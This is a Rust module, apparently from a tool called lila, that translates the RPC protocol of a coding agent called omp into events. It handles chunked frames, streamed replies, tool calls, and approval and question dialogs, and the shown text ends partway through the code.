//! omp over its RPC mode (`omp --mode rpc-ui`: one JSON object per line on stdin and stdout, docs/rpc.md in oh-my-pi),
//! for `lila host omp`. Pure translation, no IO: what omp sends goes in as lines, and
//! comes out as the frames to answer with and the events lilad gets.
//!
//! What it takes care of:
//! - the handshake: `ready`, protocol v2 (frames over 1 MiB arrive in `rpc_chunk` pieces, put together here),
//!   the session, the models and the efforts it offers;
//! - one turn at a time: words sent while a turn runs wait for it (`prompt` / `prompt_result`);
//! - the conversation: replies and thoughts as they stream, tool calls with their results;
//! - tool approvals, which omp asks as a `select` whose title is only text. The structured tool call they are about
//!   (name and arguments, from `toolcall_end` / `tool_execution_start`) fills the `PermissionRequest`, checked
//!   against the text; what cannot be matched is read from the text (`Approval`);
//! - every other dialog (`select`, `confirm`, `input`, `editor`) as a `Question` for the person.

use crate::model::*;
use base64::Engine as _;
use base64::engine::general_purpose::STANDARD;
use serde_json::{Value, json};
use std::collections::{BTreeMap, HashMap};

/// What one input led to.
#[derive(Debug, Default, PartialEq)]
pub struct Step {
    /// For omp's stdin, in order.
    pub send: Vec<Value>,
    /// For lilad.
    pub events: Vec<AgentEvent>,
}

#[derive(Debug, Clone)]
pub struct Options {
    /// The folder omp runs in.
    pub cwd: String,
    /// Tells this run of omp from the ones before it on the same thread: the ids of the items it makes begin with it,
    /// so a resumed thread never writes over what it said before.
    pub run: String,
}

#[derive(Debug, Clone, Copy, PartialEq)]
enum Asked {
    Negotiate,
    State,
    Models,
    Levels,
    Prompt,
    SetModel,
    SetLevel,
    Abort,
}

/// Text being streamed into an item, until its message ends.
struct Block {
    thought: bool,
    text: String,
    at_ms: i64,
    /// When it was last shown, and how much of the text that was.
    shown_ms: Option<i64>,
    shown_len: usize,
    done: bool,
}

/// The assistant message being written, by omp's content index.
struct Message {
    n: u64,
    blocks: BTreeMap<usize, Block>,
}

struct Tool {
    item: Item,
    name: String,
    args: Value,
    /// An approval is asked for it.
    bound: bool,
    ended: bool,
}

struct Turn {
    id: String,
    /// The `prompt` request that began it.
    req: String,
}

/// An approval dialog omp waits on: its id and the two labels it takes.
struct Approval {
    id: String,
    allow: String,
    deny: String,
}

pub struct Omp {
    opts: Options,
    next: u64,
    asked: HashMap<String, Asked>,
    chunks: Option<Chunks>,
    open: bool,
    exited: bool,
    can_image: bool,
    session: Option<String>,
    turn: Option<Turn>,
    turns: u64,
    /// The agent runs (a turn of ours, or a wake-up omp started itself).
    running: bool,
    queue: Vec<String>,
    queue_files: Vec<Attachment>,
    message: Option<Message>,
    messages: u64,
    tools: HashMap<String, Tool>,
    tool_order: Vec<String>,
    approvals: Vec<Approval>,
    questions: Vec<String>,
    usage: (u64, u64, u64),
    status: HostStatus,
    /// The time of the last input, for items made on a command.
    clock: i64,
}

/// A `rpc_chunk` sequence being put together.
struct Chunks {
    id: String,
    count: u64,
    next: u64,
    bytes: Vec<u8>,
}

/// Largest image sent inline; a bigger one goes as a path.
const MAX_IMAGE: usize = 8 << 20;
/// Most a reassembled frame may be (omp's own limit: `maxReassembledFrameBytes`).
const MAX_FRAME: usize = 64 << 20;
/// How often a reply being streamed is shown again.
const SHOW_EVERY_MS: i64 = 800;

impl Omp {
    pub fn new(opts: Options) -> Self {
        Omp {
            opts,
            next: 0,
            asked: HashMap::new(),
            chunks: None,
            open: false,
            exited: false,
            can_image: false,
            session: None,
            turn: None,
            turns: 0,
            running: false,
            queue: Vec::new(),
            queue_files: Vec::new(),
            message: None,
            messages: 0,
            tools: HashMap::new(),
            tool_order: Vec::new(),
            approvals: Vec::new(),
            questions: Vec::new(),
            usage: (0, 0, 0),
            status: HostStatus::Working,
            clock: 0,
        }
    }

    pub fn status(&self) -> HostStatus {
        self.status.clone()
    }

    fn request(&mut self, step: &mut Step, asked: Asked, mut frame: Value) {
        self.next += 1;
        let id = format!("l{}", self.next);
        frame["id"] = json!(id);
        self.asked.insert(id, asked);
        step.send.push(frame);
    }

    fn id(&self, tail: impl std::fmt::Display) -> String {
        format!("{}-{tail}", self.opts.run)
    }

    fn turn_id(&self) -> Option<String> {
        self.turn.as_ref().map(|t| t.id.clone())
    }

    fn item(&self, id: String, at_ms: i64, state: ItemState, kind: ItemKind) -> Item {
        Item { id, turn: self.turn_id(), at_ms, state, kind }
    }

    // ---------------- what lilad asks ----------------

    pub fn command(&mut self, c: Command, now_ms: i64) -> Step {
        self.clock = now_ms;
        let mut step = Step::default();
        if self.exited {
            return step;
        }
        match c {
            Command::Prompt { text, attachments } => {
                self.queue.push(text);
                self.queue_files.extend(attachments);
                self.flush(&mut step);
            }
            Command::SetModel { model } => match model.split_once('/') {
                Some((provider, id)) => self.request(&mut step, Asked::SetModel, json!({"type": "set_model", "provider": provider, "modelId": id})),
                None => step.events.push(AgentEvent::Notice { text: format!("{model:?} is not a model omp lists (provider/model)") }),
            },
            Command::SetEffort { effort } => self.request(&mut step, Asked::SetLevel, json!({"type": "set_thinking_level", "level": effort})),
            Command::Interrupt => {
                if self.turn.is_some() || self.running {
                    self.request(&mut step, Asked::Abort, json!({"type": "abort"}));
                    // Dialogs still open go away with the turn.
                    for a in std::mem::take(&mut self.approvals) {
                        step.send.push(json!({"type": "extension_ui_response", "id": a.id, "value": a.deny}));
                        step.events.push(AgentEvent::PermissionResolved { id: a.id });
                    }
                    for id in std::mem::take(&mut self.questions) {
                        step.send.push(json!({"type": "extension_ui_response", "id": id, "cancelled": true}));
                        step.events.push(AgentEvent::QuestionResolved { id });
                    }
                    self.settle_status();
                }
            }
            Command::Answer { permission, option } => {
                if let Some(i) = self.approvals.iter().position(|a| a.id == permission) {
                    let a = self.approvals.remove(i);
                    // Anything but one of the two labels omp asked with is a no.
                    let value = if option == a.allow { a.allow } else { a.deny };
                    step.send.push(json!({"type": "extension_ui_response", "id": a.id, "value": value}));
                    step.events.push(AgentEvent::PermissionResolved { id: a.id });
                    self.settle_status();
                }
            }
            Command::Reply { question, reply } => {
                if let Some(i) = self.questions.iter().position(|q| *q == question) {
                    self.questions.remove(i);
                    let mut frame = json!({"type": "extension_ui_response", "id": question});
                    match reply {
                        Reply::Choice { value } | Reply::Text { value } => frame["value"] = json!(value),
                        Reply::Confirm { yes } => frame["confirmed"] = json!(yes),
                        Reply::Cancel => frame["cancelled"] = json!(true),
                    }
                    step.send.push(frame);
                    step.events.push(AgentEvent::QuestionResolved { id: question });
                    self.settle_status();
                }
            }
        }
        step
    }

    /// Sends the words that wait, when no turn is under way (omp takes one turn at a time here).
    fn flush(&mut self, step: &mut Step) {
        if !self.open || self.turn.is_some() || self.queue.is_empty() {
            return;
        }
        let text = std::mem::take(&mut self.queue).join("\n\n");
        let files = std::mem::take(&mut self.queue_files);
        let (mut images, mut lines) = (Vec::new(), Vec::new());
        for f in &files {
            match self.image(f) {
                Some(image) => images.push(image),
                None => lines.push(format!("- {}", f.path)),
            }
        }
        let message = if lines.is_empty() { text.clone() } else { format!("{text}\n\nFiles:\n{}", lines.join("\n")) };
        let mut frame = json!({"type": "prompt", "message": message});
        if !images.is_empty() {
            frame["images"] = Value::Array(images);
        }
        // omp refuses a prompt while it runs unless it is told where to put it.
        if self.running {
            frame["streamingBehavior"] = json!("followUp");
        }
        self.next += 1;
        let req = format!("l{}", self.next);
        frame["id"] = json!(req);
        self.asked.insert(req.clone(), Asked::Prompt);
        step.send.push(frame);
        self.turns += 1;
        let turn = self.id(format!("t{}", self.turns));
        self.turn = Some(Turn { id: turn.clone(), req });
        self.usage = (0, 0, 0);
        self.status = HostStatus::Working;
        step.events.push(AgentEvent::TurnStarted { turn: turn.clone() });
        // omp echoes the message, with the notes and the paths in it: the turn's first item is the person's own words.
        // A file the words name with `@` is in the words; the cards are the files that were put on.
        let said = without_notes(text.trim()).to_owned();
        let attachments = files.into_iter().filter(|f| !f.is_mentioned_in(&said)).collect();
        let item = Item { id: format!("{turn}-said"), turn: Some(turn), at_ms: self.clock, state: ItemState::Done, kind: ItemKind::UserMessage { origin: origin(&said), text: said, attachments } };
        step.events.push(AgentEvent::Item { item });
    }

    /// A file as an image omp takes inline; any other goes into the words as a path it reads itself.
    fn image(&self, f: &Attachment) -> Option<Value> {
        let mime = image_mime(&f.path).filter(|_| f.kind == AttachmentKind::Image && self.can_image)?;
        let bytes = std::fs::read(&f.path).ok().filter(|b| b.len() <= MAX_IMAGE)?;
        Some(json!({"type": "image", "data": STANDARD.encode(bytes), "mimeType": mime}))
    }

    /// Called now and then: a reply streamed in small pieces is shown as it grows.
    pub fn tick(&mut self, now_ms: i64) -> Step {
        let mut step = Step::default();
        if let Some(m) = &mut self.message {
            let n = m.n;
            for (idx, b) in m.blocks.iter_mut().filter(|(_, b)| !b.done && b.text.len() != b.shown_len && b.shown_ms.is_some_and(|s| now_ms - s >= SHOW_EVERY_MS)) {
                b.shown_ms = Some(now_ms);
                b.shown_len = b.text.len();
                step.events.push(AgentEvent::Item { item: block_item(&self.opts.run, self.turn.as_ref().map(|t| t.id.clone()), n, *idx, b, ItemState::Running) });
            }
        }
        step
    }

    /// omp is gone: what it was doing ends, and the person is told why.
    pub fn exited(&mut self, why: &str, now_ms: i64) -> Step {
        self.clock = now_ms;
        let mut step = Step::default();
        self.end_message(&mut step, None);
        self.finish_tools(&mut step);
        self.resolve_dialogs(&mut step);
        if let Some(t) = self.turn.take() {
            step.events.push(AgentEvent::TurnEnded { turn: t.id, failed: Some(why.to_owned()) });
        }
        let item = self.item(self.id("exit"), now_ms, ItemState::Failed, ItemKind::Error { text: why.to_owned() });
        step.events.push(AgentEvent::Item { item });
        step.events.push(AgentEvent::Notice { text: why.to_owned() });
        self.status = HostStatus::Error { why: why.to_owned() };
        self.exited = true;
        step
    }

    // ---------------- what omp says ----------------

    /// The frames to send first: protocol v2 (when `ready` offers it) and what the thread needs to know of the session.
    fn begin(&mut self, step: &mut Step, ready: &Value) {
        if ready["supportedProtocolVersions"].as_array().is_some_and(|v| v.iter().any(|n| n == 2)) {
            self.request(step, Asked::Negotiate, json!({"type": "negotiate_protocol", "protocolVersion": 2}));
        }
        self.request(step, Asked::State, json!({"type": "get_state"}));
        self.request(step, Asked::Models, json!({"type": "get_available_models"}));
        self.request(step, Asked::Levels, json!({"type": "get_available_thinking_levels"}));
    }

    /// One line from omp's stdout. What is not a frame (an extension printing) is let go.
    pub fn on_line(&mut self, line: &str, now_ms: i64) -> Step {
        self.clock = now_ms;
        let mut step = Step::default();
        if self.exited {
            return step;
        }
        let Ok(frame) = serde_json::from_str::<Value>(line) else { return step };
        match frame["type"].as_str() {
            Some("rpc_chunk") => {
                if let Some(whole) = self.chunk(&frame) {
                    self.on_frame(&mut step, &whole, now_ms);
                }
            }
            Some(_) => self.on_frame(&mut step, &frame, now_ms),
            None => {}
        }
        step
    }

    /// Puts the pieces of an oversized frame together; the frame when the last one is in.
    fn chunk(&mut self, f: &Value) -> Option<Value> {
        let (id, index, count) = (f["chunkId"].as_str()?.to_owned(), f["index"].as_u64()?, f["count"].as_u64()?);
        if index == 0 {
            self.chunks = Some(Chunks { id: id.clone(), count, next: 0, bytes: Vec::new() });
        }
        let c = self.chunks.as_mut().filter(|c| c.id == id && c.next == index && c.count == count)?;
        let piece = STANDARD.decode(f["data"].as_str()?).ok();
        let Some(piece) = piece.filter(|p| c.bytes.len() + p.len() <= MAX_FRAME) else {
            self.chunks = None;
            return None;
        };
        c.bytes.extend(piece);
        c.next += 1;
        if c.next < c.count {
            return None;
        }
        let whole = self.chunks.take()?;
        serde_json::from_slice(&whole.bytes).ok()
    }

    fn on_frame(&mut self, step: &mut Step, f: &Value, now: i64) {
        match f["type"].as_str().unwrap_or_default() {
            "ready" => self.begin(step, f),
            "response" => self.on_response(step, f),
            "agent_start" => {
                self.running = true;
                if !self.blocked() {
                    self.status = HostStatus::Working;
                }
            }
            "agent_end" => {
                // A run that goes on by itself (a retry, a compaction) has not ended.
                if f["isTerminal"] != false && f["yielded"] != false {
                    self.running = false;
                    self.end_message(step, None);
                    if self.turn.is_none() && self.status == HostStatus::Working {
                        self.status = HostStatus::Done;
                    }
                }
            }
            "prompt_result" => self.on_prompt_result(step, f, now),
            "message_start" => {
                if f["message"]["role"] == "assistant" {
                    self.end_message(step, None);
                    self.messages += 1;
                    self.message = Some(Message { n: self.messages, blocks: BTreeMap::new() });
                }
            }
            "message_update" => self.on_update(step, &f["assistantMessageEvent"], now),
            "message_end" => self.on_message_end(step, &f["message"], now),
            "tool_execution_start" => self.register_tool(step, f["toolCallId"].as_str().unwrap_or_default(), f["toolName"].as_str().unwrap_or_default(), &f["args"], f["intent"].as_str(), now),
            "tool_execution_end" => self.tool_ended(step, f["toolCallId"].as_str().unwrap_or_default(), f["toolName"].as_str().unwrap_or_default(), &f["result"], f["isError"] == true, now),
            "extension_ui_request" => self.on_dialog(step, f),
            "model_changed" => {
                self.request(step, Asked::State, json!({"type": "get_state"}));
                self.request(step, Asked::Levels, json!({"type": "get_available_thinking_levels"}));
            }
            "thinking_level_changed" => {
                if let Some(level) = f["thinkingLevel"].as_str() {
                    step.events.push(config(None, Some(level.to_owned()), Vec::new(), Vec::new()));
                }
            }
            "available_commands_update" => step.events.push(AgentEvent::Commands { commands: commands_of(&f["commands"]) }),
            "notice" => {
                if matches!(f["level"].as_str(), Some("warning" | "error")) {
                    step.events.push(AgentEvent::Notice { text: f["message"].as_str().unwrap_or_default().to_owned() });
                }
            }
            "auto_retry_start" => {
                let why = f["errorMessage"].as_str().unwrap_or_default();
                step.events.push(AgentEvent::Notice { text: format!("omp tries again ({}/{}): {why}", f["attempt"], f["maxAttempts"]) });
            }
            "extension_error" => step.events.push(AgentEvent::Notice { text: format!("extension error: {}", f["error"].as_str().unwrap_or_default()) }),
            "rpc_frame_error" => step.events.push(AgentEvent::Notice { text: format!("a frame of omp was too large: {}", f["message"].as_str().unwrap_or_default()) }),
            _ => {}
        }
    }

    fn on_response(&mut self, step: &mut Step, f: &Value) {
        let Some(asked) = f["id"].as_str().and_then(|id| self.asked.remove(id)) else { return };
        let ok = f["success"] == true;
        let data = &f["data"];
        let error = f["error"].as_str().unwrap_or("omp refused the command").to_owned();
        match asked {
            Asked::Negotiate | Asked::Abort => {}
            Asked::State => {
                if ok {
                    self.on_state(step, data);
                }
                if !self.open {
                    // Without a state omp can still be talked to.
                    self.open = true;
                    self.status = HostStatus::Idle;
                    self.flush(step);
                }
            }
            Asked::Models => {
                if ok {
                    step.events.push(config(None, None, models_of(data), Vec::new()));
                }
            }
            Asked::Levels => {
                if ok {
                    let levels = data["levels"].as_array().into_iter().flatten().filter_map(Value::as_str).map(|l| Choice { id: l.to_owned(), name: l.to_owned() }).collect();
                    step.events.push(config(None, None, Vec::new(), levels));
                }
            }
            Asked::Prompt => {
                // The id is the prompt's, which settles when its `prompt_result` comes — unless it came to nothing.
                let req = f["id"].as_str().unwrap_or_default().to_owned();
                if !ok {
                    self.end_turn(step, &req, Some(error), HostStatus::Done);
                } else if data["agentInvoked"] == false {
                    // Nothing ran: a slash command that was answered on the spot, and nothing to look at.
                    self.end_turn(step, &req, None, HostStatus::Idle);
                }
            }
            Asked::SetModel => {
                if ok {
                    self.request(step, Asked::State, json!({"type": "get_state"}));
                    self.request(step, Asked::Levels, json!({"type": "get_available_thinking_levels"}));
                } else {
                    step.events.push(AgentEvent::Notice { text: error });
                }
            }
            Asked::SetLevel => {
                if ok {
                    self.request(step, Asked::State, json!({"type": "get_state"}));
                } else {
                    step.events.push(AgentEvent::Notice { text: error });
                }
            }
        }
    }

    fn on_state(&mut self, step: &mut Step, data: &Value) {
        if let Some(id) = data["sessionId"].as_str() {
            self.session = Some(id.to_owned());
            step.events.push(AgentEvent::Session { id: id.to_owned() });
        }
        let model = model_id(&data["model"]);
        self.can_image = data["model"]["input"].as_array().is_some_and(|i| i.iter().any(|m| m == "image"));
        if model.is_some() || data["thinkingLevel"].is_string() {
            step.events.push(config(model, data["thinkingLevel"].as_str().map(String::from), Vec::new(), Vec::new()));
        }
        if !self.open {
            self.open = true;
            self.running = data["isStreaming"] == true;
            self.status = if self.running { HostStatus::Working } else { HostStatus::Idle };
            self.flush(step);
        }
    }

    fn on_prompt_result(&mut self, step: &mut Step, f: &Value, now: i64) {
        let req = f["id"].as_str().unwrap_or_default().to_owned();
        if self.turn.as_ref().is_none_or(|t| t.req != req) {
            return;
        }
        let failed = (f["status"] == "error").then(|| f["error"]["message"].as_str().unwrap_or("the model request failed").to_owned());
        if let Some(why) = &failed {
            let item = self.item(self.id(format!("{}-error", self.turns)), now, ItemState::Failed, ItemKind::Error { text: why.clone() });
            step.events.push(AgentEvent::Item { item });
        }
        self.end_message(step, None);
        self.finish_tools(step);
        self.resolve_dialogs(step);
        let (input, output, cached) = self.usage;
        if input + output > 0 {
            step.events.push(AgentEvent::Usage { input, output, cached });
        }
        self.end_turn(step, &req, failed, HostStatus::Done);
    }

    /// The turn is over: lilad hears of it, and the words that waited go.
    fn end_turn(&mut self, step: &mut Step, req: &str, failed: Option<String>, then: HostStatus) {
        if self.turn.as_ref().is_some_and(|t| t.req == req)
            && let Some(t) = self.turn.take()
        {
            step.events.push(AgentEvent::TurnEnded { turn: t.id, failed });
            self.status = then;
            self.flush(step);
        }
    }

    // ---------------- the conversation ----------------

    fn on_update(&mut self, step: &mut Step, e: &Value, now: i64) {
        let Some(idx) = e["contentIndex"].as_u64().map(|i| i as usize) else { return };
        match e["type"].as_str() {
            Some("text_delta") => self.delta(step, idx, false, e["delta"].as_str().unwrap_or_default(), now),
            Some("thinking_delta") => self.delta(step, idx, true, e["delta"].as_str().unwrap_or_default(), now),
            Some("toolcall_end") => {
                // The text before a tool call is said.
                self.settle_blocks(step, None);
                let call = &e["toolCall"];
                self.register_tool(step, call["id"].as_str().unwrap_or_default(), call["name"].as_str().unwrap_or_default(), &call["arguments"], call["intent"].as_str(), now);
            }
            _ => {}
        }
    }

    fn delta(&mut self, step: &mut Step, idx: usize, thought: bool, text: &str, now: i64) {
        if self.message.is_none() {
            self.messages += 1;
            self.message = Some(Message { n: self.messages, blocks: BTreeMap::new() });
        }
        self.settle_blocks(step, Some(idx));
        let (run, turn) = (self.opts.run.clone(), self.turn_id());
        let Some(m) = &mut self.message else { return };
        let n = m.n;
        let b = m.blocks.entry(idx).or_insert(Block { thought, text: String::new(), at_ms: now, shown_ms: None, shown_len: 0, done: false });
        b.text.push_str(text);
        // The first words are shown at once, the rest as they grow.
        if b.shown_ms.is_none_or(|s| now - s >= SHOW_EVERY_MS) && !b.text.trim().is_empty() {
            b.shown_ms = Some(now);
            b.shown_len = b.text.len();
            step.events.push(AgentEvent::Item { item: block_item(&run, turn, n, idx, b, ItemState::Running) });
        }
    }

    /// The blocks written so far are final, except `keep`'s.
    fn settle_blocks(&mut self, step: &mut Step, keep: Option<usize>) {
        let (run, turn) = (self.opts.run.clone(), self.turn_id());
        let Some(m) = &mut self.message else { return };
        let n = m.n;
        for (idx, b) in m.blocks.iter_mut().filter(|(i, b)| !b.done && Some(**i) != keep) {
            b.done = true;
            if !b.text.trim().is_empty() {
                step.events.push(AgentEvent::Item { item: block_item(&run, turn.clone(), n, *idx, b, ItemState::Done) });
            }
        }
    }

    /// The message is over: its blocks are final, and `content` (the message as omp keeps it) has the last word on them.
    fn end_message(&mut self, step: &mut Step, content: Option<&Value>) {
        if let (Some(content), Some(m)) = (content.and_then(Value::as_array), &mut self.message) {
            for (idx, part) in content.iter().enumerate() {
                let (thought, text) = match part["type"].as_str() {
                    Some("text") => (false, part["text"].as_str()),
                    Some("thinking") => (true, part["thinking"].as_str()),
                    _ => continue,
                };
                if let Some(text) = text.filter(|t| !t.trim().is_empty()) {
                    let b = m.blocks.entry(idx).or_insert(Block { thought, text: String::new(), at_ms: self.clock, shown_ms: None, shown_len: 0, done: false });
                    if !b.done {
                        b.text = text.to_owned();
                    }
                }
            }
        }
        self.settle_blocks(step, None);
        self.message = None;
    }

    fn on_message_end(&mut self, step: &mut Step, m: &Value, now: i64) {
        match m["role"].as_str() {
            Some("assistant") => {
                if self.message.is_none() {
                    self.messages += 1;
                    self.message = Some(Message { n: self.messages, blocks: BTreeMap::new() });
                }
                self.end_message(step, Some(&m["content"]));
                for part in m["content"].as_array().into_iter().flatten().filter(|p| p["type"] == "toolCall") {
                    self.register_tool(step, part["id"].as_str().unwrap_or_default(), part["name"].as_str().unwrap_or_default(), &part["arguments"], part["intent"].as_str(), now);
                }
                let u = &m["usage"];
                self.usage.0 += u["input"].as_u64().unwrap_or(0);
                self.usage.1 += u["output"].as_u64().unwrap_or(0);
                self.usage.2 += u["cacheRead"].as_u64().unwrap_or(0);
            }
            // A tool's result is its own message; the event that ended the tool has said it already.
            Some("toolResult") => {
                let id = m["toolCallId"].as_str().unwrap_or_default();
                if self.tools.get(id).is_some_and(|t| !t.ended) {
                    let result = json!({"content": m["content"]});
                    self.tool_ended(step, id, m["toolName"].as_str().unwrap_or_default(), &result, m["isError"] == true, now);
                }
            }
            _ => {}
        }
    }

    /// A tool call, as the model made it or as it starts: its item, running.
    fn register_tool(&mut self, step: &mut Step, id: &str, name: &str, args: &Value, intent: Option<&str>, now: i64) {
        if id.is_empty() {
            return;
        }
        let args = without_intent(args);
        let (tool, title) = (kind_of(name), tool_title(name, &args, intent));
        let item_id = self.id(id);
        let turn = self.turn_id();
        let t = self.tools.entry(id.to_owned()).or_insert_with(|| Tool {
            item: Item { id: item_id, turn, at_ms: now, state: ItemState::Running, kind: ItemKind::ToolCall { tool, name: name.to_owned(), title: String::new(), output: None, diffs: Vec::new() } },
            name: name.to_owned(),
            args: Value::Null,
            bound: false,
            ended: false,
        });
        if !self.tool_order.iter().any(|i| i == id) {
            self.tool_order.push(id.to_owned());
        }
        if t.ended {
            return;
        }
        t.args = args;
        if let ItemKind::ToolCall { title: shown, .. } = &mut t.item.kind {
            *shown = title;
        }
        step.events.push(AgentEvent::Item { item: t.item.clone() });
    }

    fn tool_ended(&mut self, step: &mut Step, id: &str, name: &str, result: &Value, failed: bool, now: i64) {
        if !self.tools.contains_key(id) {
            self.register_tool(step, id, name, &Value::Null, None, now);
        }
        let Some(t) = self.tools.get_mut(id) else { return };
        t.ended = true;
        t.item.state = if failed { ItemState::Failed } else { ItemState::Done };
        let details = &result["details"];
        if let ItemKind::ToolCall { title, output, diffs, .. } = &mut t.item.kind {
            *output = output_of(&result["content"]);
            *diffs = diffs_of(details);
            if t.name == "edit" && !diffs.is_empty() {
                *title = diffs.iter().map(|d| d.path.clone()).collect::<Vec<_>>().join(", ");
            }
        }
        step.events.push(AgentEvent::Item { item: t.item.clone() });
    }

    /// Tools still running when the turn ends did not finish.
    fn finish_tools(&mut self, step: &mut Step) {
        for id in &self.tool_order {
            if let Some(t) = self.tools.get_mut(id).filter(|t| !t.ended) {
                t.ended = true;
                t.item.state = ItemState::Failed;
                step.events.push(AgentEvent::Item { item: t.item.clone() });
            }
        }
        self.tools.clear();
        self.tool_order.clear();
    }

    // ---------------- dialogs ----------------

    fn blocked(&self) -> bool {
        !self.approvals.is_empty() || !self.questions.is_empty()
    }

    /// The status once no dialog waits (or the one that waits).
    fn settle_status(&mut self) {
        if matches!(self.status, HostStatus::Blocked { .. }) && !self.blocked() {
            self.status = if self.turn.is_some() || self.running { HostStatus::Working } else { HostStatus::Idle };
        }
    }

    /// Dialogs omp no longer waits on: the turn is over.
    fn resolve_dialogs(&mut self, step: &mut Step) {
        for a in self.approvals.drain(..) {
            step.events.push(AgentEvent::PermissionResolved { id: a.id });
        }
        for id in self.questions.drain(..) {
            step.events.push(AgentEvent::QuestionResolved { id });
        }
    }

    fn on_dialog(&mut self, step: &mut Step, f: &Value) {
        let (Some(method), Some(id)) = (f["method"].as_str(), f["id"].as_str()) else { return };
        if method == "cancel" {
            // omp took a dialog back (it timed out, or its turn was aborted).
            let target = f["targetId"].as_str().unwrap_or_default();
            if let Some(i) = self.approvals.iter().position(|a| a.id == target) {
                let a = self.approvals.remove(i);
                step.events.push(AgentEvent::PermissionResolved { id: a.id });
            }
            if let Some(i) = self.questions.iter().position(|q| q == target) {
                step.events.push(AgentEvent::QuestionResolved { id: self.questions.remove(i) });
            }
            self.settle_status();
            return;
        }
        let strings = |k: &str| -> Vec<String> { f[k].as_array().into_iter().flatten().filter_map(Value::as_str).map(String::from).collect() };
        let title = f["title"].as_str().unwrap_or_default();
        if method == "select" && title.starts_with(APPROVAL) {
            let options = strings("options");
            let deny = options.iter().find(|o| *o == "Deny").cloned();
            // The labels omp asks with: the plain approval (not "for this session": Lila's rules do that) and Deny.
            let allow = options.iter().find(|o| o.starts_with("Approve") && !o.contains(" for this session") && !o.contains("Always") && !o.contains("Directory") && !o.contains("File")).cloned();
            if let (Some(allow), Some(deny)) = (allow, deny) {
                let request = self.approval_request(id, title, &allow, &deny);
                self.approvals.push(Approval { id: id.to_owned(), allow, deny });
                self.status = HostStatus::Blocked { why: request.title.clone() };
                step.events.push(AgentEvent::Permission { request });
                return;
            }
        }
        let question = match method {
            "select" => Question { id: id.to_owned(), title: title.to_owned(), detail: String::new(), kind: QuestionKind::Choice, options: strings("options"), prefill: String::new(), secret: false },
            "confirm" => Question { id: id.to_owned(), title: title.to_owned(), detail: f["message"].as_str().unwrap_or_default().to_owned(), kind: QuestionKind::Confirm, options: Vec::new(), prefill: String::new(), secret: false },
            "input" => Question { id: id.to_owned(), title: title.to_owned(), detail: String::new(), kind: QuestionKind::Text, options: Vec::new(), prefill: f["placeholder"].as_str().unwrap_or_default().to_owned(), secret: f["secret"] == true },
            "editor" => Question { id: id.to_owned(), title: title.to_owned(), detail: String::new(), kind: QuestionKind::Text, options: Vec::new(), prefill: f["prefill"].as_str().unwrap_or_default().to_owned(), secret: false },
            // Status lines, widgets, notices: nothing waits on them.
            _ => return,
        };
        self.questions.push(id.to_owned());
        self.status = HostStatus::Blocked { why: question.title.lines().next().unwrap_or_default().to_owned() };
        step.events.push(AgentEvent::Question { question });
    }

    /// The request for an approval dialog `title`.
    fn approval_request(&mut self, id: &str, title: &str, allow: &str, deny: &str) -> PermissionRequest {
        let name = title[APPROVAL.len()..].lines().next().unwrap_or_default().trim().to_owned();
        let rows = TitleRows::of(title);
        let tool = self.bind_tool(&name, title);
        let known = tool.as_ref().and_then(|t| self.tools.get(t));
        let args = known.map_or(Value::Null, |t| t.args.clone());
        // What the call is called in the conversation: its words, else what the model said it was doing.
        let called = known.and_then(|t| match &t.item.kind {
            ItemKind::ToolCall { title, .. } => Some(title.clone()),
            _ => None,
        });
        let text = |k: &str| args[k].as_str().filter(|v| !v.trim().is_empty()).map(String::from);
        // What the model asked for is trusted only where the dialog says the same: an extension may have changed the call
        // after it was made, and the dialog is what omp actually waits on.
        let said = |v: &str| title.contains(v.chars().take(200).collect::<String>().as_str());
        let command = if name == "bash" { text("command").filter(|c| said(c)).or_else(|| rows.command.clone()) } else { None };
        let mut paths: Vec<String> = match name.as_str() {
            "write" | "read" | "ast_edit" => text("path").filter(|p| said(p)).into_iter().collect(),
            _ => Vec::new(),
        };
        if paths.is_empty() {
            paths = rows.paths.clone();
        }
        let shown = match name.as_str() {
            "bash" => command.clone().unwrap_or_default(),
            "eval" => text("title").or_else(|| text("code")).or_else(|| rows.value("Code")).unwrap_or_default(),
            _ => paths.join(", "),
        };
        let shown = if shown.trim().is_empty() { called.unwrap_or_else(|| name.clone()) } else { shown };
        let cwd = text("cwd").filter(|_| name == "bash").map(|c| if c.starts_with('/') { c } else { format!("{}/{c}", self.opts.cwd.trim_end_matches('/')) });
        let options = vec![PermOption { id: allow.to_owned(), label: "允许".into(), kind: PermKind::Allow }, PermOption { id: deny.to_owned(), label: "拒绝".into(), kind: PermKind::Reject }];
        PermissionRequest { command, paths, cwd, name: name.clone(), ..PermissionRequest::new(id, kind_of(&name), one_line(&shown), rows.reason.unwrap_or_default(), options) }
    }

    /// The pending tool call an approval for tool `name` is about: the only one of that name, or of several the one
    /// whose words the dialog has. None when it cannot be told.
    fn bind_tool(&mut self, name: &str, title: &str) -> Option<String> {
        let open: Vec<&String> = self.tool_order.iter().filter(|id| self.tools.get(*id).is_some_and(|t| !t.ended && !t.bound && t.name == name)).collect();
        let found = match open.as_slice() {
            [] => None,
            [only] => Some((*only).clone()),
            many => many.iter().find(|id| self.tools.get(**id).is_some_and(|t| primary(&t.args).is_some_and(|p| title.contains(p.chars().take(200).collect::<String>().as_str())))).map(|id| (*id).clone()),
        }?;
        if let Some(t) = self.tools.get_mut(&found) {
            t.bound = true;
        }
        Some(found)
    }
}

/// Where the title of an approval dialog begins.
const APPROVAL: &str = "Allow tool: ";

/// What omp's own formatter of an approval prompt says about a call, line by line (`Command: …`, `File: …`).
#[derive(Default)]
struct TitleRows {
    reason: Option<String>,
    command: Option<String>,
    paths: Vec<String>,
    rest: Vec<(String, String)>,
}

impl TitleRows {
    fn of(title: &str) -> TitleRows {
        let mut rows = TitleRows::default();
        let mut lines = title.lines().skip(1).peekable();
        while let Some(line) = lines.next() {
            let Some((label, value)) = line.split_once(": ").or_else(|| line.strip_suffix(':').map(|l| (l, ""))) else { continue };
            match label {
                "Reason" => rows.reason = Some(value.to_owned()),
                // The command is the rest of the title: it may run over several lines.
                "Command" => {
                    let tail: Vec<&str> = lines.by_ref().collect();
                    rows.command = Some(std::iter::once(value).chain(tail).collect::<Vec<_>>().join("\n"));
                }
                "File" | "Path" => rows.paths.push(value.to_owned()),
                "Move" => rows.paths.extend(value.split(" → ").map(String::from)),
                // What the call carries (a file's new content, code, arguments) runs to the end: lines in it are not rows.
                "Code" | "Content" | "Arguments" | "Task" | "Context" => {
                    let tail: Vec<&str> = lines.by_ref().collect();
                    rows.rest.push((label.to_owned(), tail.join("\n")));
                }
                _ => rows.rest.push((label.to_owned(), value.to_owned())),
            }
        }
        rows
    }

